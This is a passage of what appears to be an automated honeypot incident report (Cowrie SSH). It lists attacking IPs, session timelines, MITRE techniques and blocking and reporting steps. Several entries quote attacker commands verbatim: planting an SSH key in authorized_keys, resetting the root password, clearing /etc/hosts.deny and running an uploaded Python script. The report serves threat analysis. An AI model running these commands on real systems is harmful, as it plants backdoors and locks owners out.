- [ ] Submit `200.219.200[.]16` to AbuseIPDB if not already reported
- [ ] Block `200.219.200[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dddef8a8b04b

| Field | Detail |
|---|---|
| **Source IP** | `200.219.200[.]16` |
| **First Seen** | 2026-06-29 15:48 |
| **Last Seen** | 2026-06-29 15:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:48:40` | `cowrie.session.connect` |
| `2026-06-29 15:48:40` | `cowrie.client.version` |
| `2026-06-29 15:48:40` | `cowrie.client.kex` |
| `2026-06-29 15:48:40` | `cowrie.login.success` |
| `2026-06-29 15:48:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.219.200[.]16` to AbuseIPDB if not already reported
- [ ] Block `200.219.200[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edaf6992f26e

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-29 15:48 |
| **Last Seen** | 2026-06-29 15:49 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:48:56` | `cowrie.session.connect` |
| `2026-06-29 15:48:57` | `cowrie.client.version` |
| `2026-06-29 15:48:57` | `cowrie.client.kex` |
| `2026-06-29 15:49:02` | `cowrie.login.success` |
| `2026-06-29 15:49:05` | `cowrie.session.params` |
| `2026-06-29 15:49:05` | `cowrie.command.input` |
| `2026-06-29 15:49:08` | `cowrie.log.closed` |
| `2026-06-29 15:49:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36a65292ab3c

| Field | Detail |
|---|---|
| **Source IP** | `68.183.178[.]130` |
| **First Seen** | 2026-06-29 15:51 |
| **Last Seen** | 2026-06-29 15:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:51:31` | `cowrie.session.connect` |
| `2026-06-29 15:51:31` | `cowrie.client.version` |
| `2026-06-29 15:51:31` | `cowrie.client.kex` |
| `2026-06-29 15:51:32` | `cowrie.login.success` |
| `2026-06-29 15:51:33` | `cowrie.session.params` |
| `2026-06-29 15:51:33` | `cowrie.command.input` |
| `2026-06-29 15:51:33` | `cowrie.command.failed` |
| `2026-06-29 15:51:34` | `cowrie.log.closed` |
| `2026-06-29 15:51:35` | `cowrie.session.params` |
| `2026-06-29 15:51:35` | `cowrie.command.input` |
| `2026-06-29 15:51:35` | `cowrie.session.file_download` |
| `2026-06-29 15:51:35` | `cowrie.log.closed` |
| `2026-06-29 15:51:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.178[.]130` to AbuseIPDB if not already reported
- [ ] Block `68.183.178[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d17bbfd74e8b

| Field | Detail |
|---|---|
| **Source IP** | `68.183.178[.]130` |
| **First Seen** | 2026-06-29 15:51 |
| **Last Seen** | 2026-06-29 15:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:51:35` | `cowrie.session.connect` |
| `2026-06-29 15:51:35` | `cowrie.client.version` |
| `2026-06-29 15:51:35` | `cowrie.client.kex` |
| `2026-06-29 15:51:36` | `cowrie.login.success` |
| `2026-06-29 15:51:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.178[.]130` to AbuseIPDB if not already reported
- [ ] Block `68.183.178[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a30f244c18d6

| Field | Detail |
|---|---|
| **Source IP** | `68.183.178[.]130` |
| **First Seen** | 2026-06-29 15:51 |
| **Last Seen** | 2026-06-29 15:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:51:37` | `cowrie.session.connect` |
| `2026-06-29 15:51:37` | `cowrie.client.version` |
| `2026-06-29 15:51:37` | `cowrie.client.kex` |
| `2026-06-29 15:51:38` | `cowrie.login.success` |
| `2026-06-29 15:51:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.178[.]130` to AbuseIPDB if not already reported
- [ ] Block `68.183.178[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbbc5cfd9346

| Field | Detail |
|---|---|
| **Source IP** | `121.237.10[.]191` |
| **First Seen** | 2026-06-29 15:52 |
| **Last Seen** | 2026-06-29 15:57 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:52:05` | `cowrie.session.connect` |
| `2026-06-29 15:52:05` | `cowrie.client.version` |
| `2026-06-29 15:52:05` | `cowrie.client.kex` |
| `2026-06-29 15:52:07` | `cowrie.login.success` |
| `2026-06-29 15:52:09` | `cowrie.session.params` |
| `2026-06-29 15:52:09` | `cowrie.command.input` |
| `2026-06-29 15:52:09` | `cowrie.command.failed` |
| `2026-06-29 15:52:09` | `cowrie.log.closed` |
| `2026-06-29 15:52:10` | `cowrie.session.params` |
| `2026-06-29 15:52:10` | `cowrie.command.input` |
| `2026-06-29 15:52:10` | `cowrie.session.file_download` |
| `2026-06-29 15:52:10` | `cowrie.log.closed` |
| `2026-06-29 15:57:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.237.10[.]191` to AbuseIPDB if not already reported
- [ ] Block `121.237.10[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-602e2ae96858

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-29 15:53 |
| **Last Seen** | 2026-06-29 15:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:53:53` | `cowrie.session.connect` |
| `2026-06-29 15:53:54` | `cowrie.client.version` |
| `2026-06-29 15:53:54` | `cowrie.client.kex` |
| `2026-06-29 15:53:55` | `cowrie.login.success` |
| `2026-06-29 15:53:57` | `cowrie.session.params` |
| `2026-06-29 15:53:57` | `cowrie.command.input` |
| `2026-06-29 15:53:58` | `cowrie.log.closed` |
| `2026-06-29 15:53:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-782bb8df4e2c

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-06-29 15:55 |
| **Last Seen** | 2026-06-29 15:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:55:10` | `cowrie.session.connect` |
| `2026-06-29 15:55:10` | `cowrie.client.version` |
| `2026-06-29 15:55:10` | `cowrie.client.kex` |
| `2026-06-29 15:55:11` | `cowrie.login.success` |
| `2026-06-29 15:55:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba6509ab21d7

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-06-29 15:55 |
| **Last Seen** | 2026-06-29 15:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:55:11` | `cowrie.session.connect` |
| `2026-06-29 15:55:11` | `cowrie.client.version` |
| `2026-06-29 15:55:11` | `cowrie.client.kex` |
| `2026-06-29 15:55:12` | `cowrie.login.success` |
| `2026-06-29 15:55:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bee33239b26c

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-06-29 15:55 |
| **Last Seen** | 2026-06-29 15:57 |
| **Session Duration** | 129s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:55:31` | `cowrie.session.connect` |
| `2026-06-29 15:55:31` | `cowrie.client.version` |
| `2026-06-29 15:55:31` | `cowrie.client.kex` |
| `2026-06-29 15:55:32` | `cowrie.login.success` |
| `2026-06-29 15:55:34` | `cowrie.session.file_upload` |
| `2026-06-29 15:55:35` | `cowrie.session.params` |
| `2026-06-29 15:55:35` | `cowrie.command.input` |
| `2026-06-29 15:55:35` | `cowrie.command.input` |
| `2026-06-29 15:55:35` | `cowrie.command.input` |
| `2026-06-29 15:55:35` | `cowrie.command.failed` |
| `2026-06-29 15:55:35` | `cowrie.log.closed` |
| `2026-06-29 15:55:36` | `cowrie.session.params` |
| `2026-06-29 15:55:36` | `cowrie.command.input` |
| `2026-06-29 15:55:36` | `cowrie.log.closed` |
| `2026-06-29 15:55:37` | `cowrie.session.params` |
| `2026-06-29 15:55:37` | `cowrie.command.input` |
| `2026-06-29 15:55:37` | `cowrie.log.closed` |
| `2026-06-29 15:55:38` | `cowrie.session.params` |
| `2026-06-29 15:55:38` | `cowrie.command.input` |
| `2026-06-29 15:55:38` | `cowrie.command.failed` |
| `2026-06-29 15:55:38` | `cowrie.command.failed` |
| `2026-06-29 15:56:39` | `cowrie.session.params` |
| `2026-06-29 15:56:39` | `cowrie.command.input` |
| `2026-06-29 15:57:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f45e402686a0

| Field | Detail |
|---|---|
| **Source IP** | `121.237.10[.]191` |
| **First Seen** | 2026-06-29 15:57 |
| **Last Seen** | 2026-06-29 16:02 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:57:05` | `cowrie.session.connect` |
| `2026-06-29 15:57:05` | `cowrie.client.version` |
| `2026-06-29 15:57:05` | `cowrie.client.kex` |
| `2026-06-29 15:57:08` | `cowrie.login.success` |
| `2026-06-29 15:57:09` | `cowrie.session.params` |
| `2026-06-29 15:57:09` | `cowrie.command.input` |
| `2026-06-29 15:57:09` | `cowrie.command.failed` |
| `2026-06-29 15:57:10` | `cowrie.log.closed` |
| `2026-06-29 15:57:12` | `cowrie.session.params` |
| `2026-06-29 15:57:12` | `cowrie.command.input` |
| `2026-06-29 15:57:12` | `cowrie.session.file_download` |
| `2026-06-29 15:57:12` | `cowrie.log.closed` |
| `2026-06-29 16:02:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.237.10[.]191` to AbuseIPDB if not already reported
- [ ] Block `121.237.10[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2491700a9ac8

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-06-29 15:57 |
| **Last Seen** | 2026-06-29 15:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:57:33` | `cowrie.session.connect` |
| `2026-06-29 15:57:33` | `cowrie.client.version` |
| `2026-06-29 15:57:33` | `cowrie.client.kex` |
| `2026-06-29 15:57:33` | `cowrie.login.success` |
| `2026-06-29 15:57:34` | `cowrie.session.params` |
| `2026-06-29 15:57:34` | `cowrie.command.input` |
| `2026-06-29 15:57:34` | `cowrie.log.closed` |
| `2026-06-29 15:57:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c881c945ce29

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-06-29 15:57 |
| **Last Seen** | 2026-06-29 16:00 |
| **Session Duration** | 130s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:57:56` | `cowrie.session.connect` |
| `2026-06-29 15:57:56` | `cowrie.client.version` |
| `2026-06-29 15:57:56` | `cowrie.client.kex` |
| `2026-06-29 15:57:57` | `cowrie.login.success` |
| `2026-06-29 15:57:59` | `cowrie.session.file_upload` |
| `2026-06-29 15:57:59` | `cowrie.session.params` |
| `2026-06-29 15:57:59` | `cowrie.command.input` |
| `2026-06-29 15:57:59` | `cowrie.command.input` |
| `2026-06-29 15:57:59` | `cowrie.command.input` |
| `2026-06-29 15:57:59` | `cowrie.command.failed` |
| `2026-06-29 15:58:00` | `cowrie.log.closed` |
| `2026-06-29 15:58:01` | `cowrie.session.params` |
| `2026-06-29 15:58:01` | `cowrie.command.input` |
| `2026-06-29 15:58:01` | `cowrie.log.closed` |
| `2026-06-29 15:58:02` | `cowrie.session.params` |
| `2026-06-29 15:58:02` | `cowrie.command.input` |
| `2026-06-29 15:58:02` | `cowrie.log.closed` |
| `2026-06-29 15:58:03` | `cowrie.session.params` |
| `2026-06-29 15:58:03` | `cowrie.command.input` |
| `2026-06-29 15:58:03` | `cowrie.command.failed` |
| `2026-06-29 15:58:03` | `cowrie.command.failed` |
| `2026-06-29 15:59:05` | `cowrie.session.params` |
| `2026-06-29 15:59:05` | `cowrie.command.input` |
| `2026-06-29 16:00:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45f9ae4238de

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-29 16:02 |
| **Last Seen** | 2026-06-29 16:02 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 16:02:07` | `cowrie.session.connect` |
| `2026-06-29 16:02:09` | `cowrie.client.version` |
| `2026-06-29 16:02:09` | `cowrie.client.kex` |
| `2026-06-29 16:02:15` | `cowrie.login.success` |
| `2026-06-29 16:02:19` | `cowrie.session.params` |
| `2026-06-29 16:02:19` | `cowrie.command.input` |
| `2026-06-29 16:02:21` | `cowrie.log.closed` |
| `2026-06-29 16:02:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9a8fc714adb

| Field | Detail |
|---|---|
| **Source IP** | `1.12.223[.]79` |
| **First Seen** | 2026-06-29 16:05 |
| **Last Seen** | 2026-06-29 16:06 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:Mk6Tire02aYz"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 16:05:52` | `cowrie.session.connect` |
| `2026-06-29 16:05:55` | `cowrie.client.version` |
| `2026-06-29 16:05:55` | `cowrie.client.kex` |
| `2026-06-29 16:05:56` | `cowrie.login.success` |
| `2026-06-29 16:05:58` | `cowrie.session.params` |
| `2026-06-29 16:05:58` | `cowrie.command.input` |
| `2026-06-29 16:05:58` | `cowrie.command.failed` |
| `2026-06-29 16:05:59` | `cowrie.log.closed` |
| `2026-06-29 16:06:00` | `cowrie.session.params` |
| `2026-06-29 16:06:00` | `cowrie.command.input` |
| `2026-06-29 16:06:00` | `cowrie.session.file_download` |
| `2026-06-29 16:06:00` | `cowrie.log.closed` |
| `2026-06-29 16:06:17` | `cowrie.session.params` |
| `2026-06-29 16:06:17` | `cowrie.command.input` |
| `2026-06-29 16:06:18` | `cowrie.log.closed` |
| `2026-06-29 16:06:19` | `cowrie.session.params` |
| `2026-06-29 16:06:19` | `cowrie.command.input` |
| `2026-06-29 16:06:19` | `cowrie.log.closed` |
| `2026-06-29 16:06:20` | `cowrie.session.params` |
| `2026-06-29 16:06:20` | `cowrie.command.input` |
| `2026-06-29 16:06:20` | `cowrie.session.file_download` |
| `2026-06-29 16:06:20` | `cowrie.log.closed` |
| `2026-06-29 16:06:21` | `cowrie.session.params` |
| `2026-06-29 16:06:21` | `cowrie.command.input` |
| `2026-06-29 16:06:22` | `cowrie.log.closed` |
| `2026-06-29 16:06:23` | `cowrie.session.params` |
| `2026-06-29 16:06:23` | `cowrie.command.input` |
| `2026-06-29 16:06:24` | `cowrie.log.closed` |
| `2026-06-29 16:06:24` | `cowrie.session.params` |
| `2026-06-29 16:06:24` | `cowrie.command.input` |
| `2026-06-29 16:06:24` | `cowrie.command.input` |
| `2026-06-29 16:06:25` | `cowrie.log.closed` |
| `2026-06-29 16:06:26` | `cowrie.session.params` |
| `2026-06-29 16:06:26` | `cowrie.command.input` |
| `2026-06-29 16:06:26` | `cowrie.log.closed` |
| `2026-06-29 16:06:27` | `cowrie.session.params` |
| `2026-06-29 16:06:27` | `cowrie.command.input` |
| `2026-06-29 16:06:28` | `cowrie.log.closed` |
| `2026-06-29 16:06:29` | `cowrie.session.params` |
| `2026-06-29 16:06:29` | `cowrie.command.input` |
| `2026-06-29 16:06:29` | `cowrie.log.closed` |
| `2026-06-29 16:06:30` | `cowrie.session.params` |
| `2026-06-29 16:06:30` | `cowrie.command.input` |
| `2026-06-29 16:06:31` | `cowrie.log.closed` |
| `2026-06-29 16:06:31` | `cowrie.session.params` |
| `2026-06-29 16:06:31` | `cowrie.command.input` |
| `2026-06-29 16:06:32` | `cowrie.log.closed` |
| `2026-06-29 16:06:33` | `cowrie.session.params` |
| `2026-06-29 16:06:33` | `cowrie.command.input` |
| `2026-06-29 16:06:33` | `cowrie.log.closed` |
| `2026-06-29 16:06:34` | `cowrie.session.params` |
| `2026-06-29 16:06:34` | `cowrie.command.input` |
| `2026-06-29 16:06:35` | `cowrie.log.closed` |
| `2026-06-29 16:06:35` | `cowrie.session.params` |
| `2026-06-29 16:06:35` | `cowrie.command.input` |
| `2026-06-29 16:06:36` | `cowrie.log.closed` |
| `2026-06-29 16:06:37` | `cowrie.session.params` |
| `2026-06-29 16:06:37` | `cowrie.command.input` |
| `2026-06-29 16:06:37` | `cowrie.log.closed` |
| `2026-06-29 16:06:38` | `cowrie.session.params` |
| `2026-06-29 16:06:38` | `cowrie.command.input` |
| `2026-06-29 16:06:38` | `cowrie.log.closed` |
| `2026-06-29 16:06:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.12.223[.]79` to AbuseIPDB if not already reported
- [ ] Block `1.12.223[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4ddb0dc185d

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-29 16:08 |
| **Last Seen** | 2026-06-29 16:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 16:08:56` | `cowrie.session.connect` |
| `2026-06-29 16:08:56` | `cowrie.client.version` |
| `2026-06-29 16:08:56` | `cowrie.client.kex` |
| `2026-06-29 16:08:58` | `cowrie.login.success` |
| `2026-06-29 16:08:59` | `cowrie.session.params` |
| `2026-06-29 16:08:59` | `cowrie.command.input` |
| `2026-06-29 16:09:00` | `cowrie.log.closed` |
| `2026-06-29 16:09:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-282787ee9bc6

| Field | Detail |
|---|---|
| **Source IP** | `34.53.189[.]16` |
| **First Seen** | 2026-06-29 16:12 |
| **Last Seen** | 2026-06-29 16:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 16:12:52` | `cowrie.session.connect` |
| `2026-06-29 16:12:52` | `cowrie.login.success` |
| `2026-06-29 16:12:53` | `cowrie.session.params` |
| `2026-06-29 16:12:53` | `cowrie.command.input` |
| `2026-06-29 16:12:53` | `cowrie.command.input` |
| `2026-06-29 16:12:53` | `cowrie.command.failed` |
| `2026-06-29 16:12:53` | `cowrie.command.input` |
| `2026-06-29 16:12:53` | `cowrie.log.closed` |
